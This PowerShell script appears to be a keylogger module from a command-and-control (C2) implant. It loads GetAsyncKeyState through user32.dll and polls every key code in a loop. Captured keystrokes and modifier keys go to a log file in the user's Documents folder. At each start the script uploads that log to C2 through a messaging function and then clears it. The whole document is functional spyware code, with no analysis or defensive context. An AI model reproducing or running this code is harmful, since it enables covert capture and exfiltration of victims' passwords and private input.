#Import GetAsyncKeyState DLL for the input logger
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@

function Write-Input
{
	[CmdletBinding()] Param
    (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)][Alias("message","text")][String] $body,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)][Alias("issueNum","issue","issNum","iss")][int] $issueNumber
    )

	$inputLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\input.log"
	try
	{
		Add-Content -Path $inputLogPath -Value $body
	}
	catch
	{
        Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Encountered an error trying to write to the input log. The error message is: " + $Error)
        Write-Console -Body ("Exception thrown trying to write to the input log. Exiting. Error: " + $Error) -IssueNumber $issueNumber
		Write-Host ("DEBUG: Exception thrown trying to write to the input log. Exiting. Error: " + $Error); Start-Sleep -s 600
		Exit
	}
}

function Start-Logging
{
	[CmdletBinding()] Param
    (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)][Alias("issueNum","issue","issNum","iss")][int] $issueNumber
    )

	#Load GetAsyncKeyState so we can use it.
	#Note: GetAsyncKeyState cannot record keystrokes made while a higher integrity application is in focus.
	try 
	{
		$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
		Write-Console -Body ("Loaded the GetAysncKeyState DLL OK.") -IssueNumber $issueNumber
		Write-Host ("DEBUG: Loaded the GetAysncKeyState DLL OK.")
	}
	catch 
	{
		Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to load the GetAsyncKeyState DLL. Exiting. Error: " + $Error)
		Write-Console -Body ("Exception thrown trying to load the GetAsyncKeyState DLL. Exiting. Error: " + $Error) -IssueNumber $issueNumber
		Write-Host ("DEBUG: Exception thrown trying to load the GetAsyncKeyState DLL. Exiting. Error: " + $Error); Start-Sleep -s 600
		Exit
	}
	
	#Buffer all the input we need to write to the log in this variable. Declare it here so it remains in scope during the core logging loop.
	$inputBuffer = ""

	#Create the array to track if we can write the key. Writing is only allowed if the key was released since it was last written to the log.
	[bool[]]$writeOK = @($true)
	For($i=0; $i -lt 255; $i++)
	{
		$writeOK += $true
	}

	#Core input logging loop. This will loop very frequently so make sure the performance is good.
	While($true)
	{
		#Check if we need to write the buffer to the input log file
		If($inputBuffer.length -gt 250)
		{
			try
			{
				Write-Input -Body $inputBuffer -IssueNumber $issueNumber
				Write-Console -Body ("Wrote the input buffer to the input log. Clearing.") -IssueNumber $issueNumber
				Write-Host ("DEBUG: Wrote the input buffer to the input log. Clearing.")
				$inputBuffer = ""
			}
			catch
			{
				Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to write input from the buffer to the log. Exiting. Error: " + $Error)
				Write-Console -Body ("Exception thrown trying to write input from the buffer to the log. Exiting. Error: " + $Error) -IssueNumber $issueNumber
				Write-Host ("DEBUG: Exception thrown trying to write input from the buffer to the log. Exiting. Error: " + $Error); Start-Sleep -s 600
				Exit
			}
		}
		#Loop through all the keys and write depressed keys to the input buffer, then set their writeOK state to false until they're released.
		For($i=0; $i -lt 255; $i++)
		{
			try 
			{
				If(($API::GetAsyncKeyState($i) -gt 30000) -Or ($API::GetAsyncKeyState($i) -lt -30000))
				{
					If($writeOK[$i] -And !($i -eq 16) -And !($i -eq 17) -And !($i -eq 18) -And !($i -eq 160) -And !($i -eq 162) -And !($i -eq 164))
					{
						#Start the write to the input buffer with the "?" character
						$inputBuffer = ($inputBuffer + "?")
						
						#Write the modifier key codes to the input buffer
						If(($API::GetAsyncKeyState(160) -gt 30000) -Or ($API::GetAsyncKeyState(160) -lt -30000) -Or ($API::GetAsyncKeyState(16) -gt 30000) -Or ($API::GetAsyncKeyState(16) -lt -30000))
						{
							$inputBuffer = ($inputBuffer + "S")
						}
						If(($API::GetAsyncKeyState(162) -gt 30000) -Or ($API::GetAsyncKeyState(162) -lt -30000) -Or ($API::GetAsyncKeyState(17) -gt 30000) -Or ($API::GetAsyncKeyState(17) -lt -30000))
						{
							$inputBuffer = ($inputBuffer + "C")
						}
						If(($API::GetAsyncKeyState(164) -gt 30000) -Or ($API::GetAsyncKeyState(164) -lt -30000) -Or ($API::GetAsyncKeyState(18) -gt 30000) -Or ($API::GetAsyncKeyState(18) -lt -30000))
						{
							$inputBuffer = ($inputBuffer + "A")
						}
						$inputBuffer = ($inputBuffer + $i)
						$writeOK[$i] = $false
						Write-Host ("DEBUG: Wrote key code $i to log.")
					}
				}
				Else
				{
					$writeOK[$i] = $true
				}
			}
			catch 
			{
				Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown getting key state. Exiting. Error: " + $Error)
				Write-Console -Body ("Exception thrown getting key state. Exiting. Error: " + $Error) -IssueNumber $issueNumber
				Write-Host ("DEBUG: Exception thrown getting key state. Exiting. Error: " + $Error); Start-Sleep -s 600
				Exit
			}
		}
		Start-Sleep -m 10
	}
}

#ENTRY POINT
#Write startup message to console
Write-Console -Body ("Input logger starting.") -IssueNumber $issueNumber
Write-Host "DEBUG: Input logger starting."

#Upload the input log to C2, then clear it.
try 
{
    #Write a M1 click to the input file to make sure it exists and we can write to it without issues.
    Write-Input -Body "?1" -IssueNumber $issueNumber
    
    $inputLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\input.log"
	If([System.IO.File]::Exists($inputLogPath))
	{
		Send-PackageMessage -Package "INPUT" -IssueNumber $issueNumber -Body (Get-Content -Path $inputLogPath -Raw)
		Write-Host "DEBUG: Uploaded the input log to C2. Clearing it..."
		Clear-Content -Path $inputLogPath
		Write-Console -Body "Uploaded the input log and cleared it." -IssueNumber $issueNumber
		Write-Host "DEBUG: Cleared the old input log."
	}
	Else
	{
		Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Attempted to upload the input log, but was unable to find the file. Exiting.")
		Write-Console -Body "Attempted to upload the input log, but was unable to find the file. Exiting." -IssueNumber $issueNumber
		Write-Host "DEBUG: Attempted to upload the input log, but was unable to find the file. Exiting."; Start-Sleep -s 600
		Exit
	}
}
catch 
{
	Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to upload the input log file. Exiting. Error: " + $Error)
	Write-Console -Body "Exception thrown trying to upload the input log file. Notified C2. Exiting." -IssueNumber $issueNumber
	Write-Host "DEBUG: Exception thrown trying to upload the input log file. Notified C2. Exiting."; Start-Sleep -s 600
	Exit
}

#Start logging. The log will not be uploaded until the computer restarts and this script is run again.
try
{
    Start-Logging -IssueNumber $issueNumber
}
catch
{
    Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to start the logging function. Exiting. Error: " + $Error)
	Write-Console -Body "Exception thrown trying to start the logging function. Notified C2. Exiting." -IssueNumber $issueNumber
	Write-Host "DEBUG: Exception thrown trying to start the logging function. Notified C2. Exiting."; Start-Sleep -s 600
	Exit
}
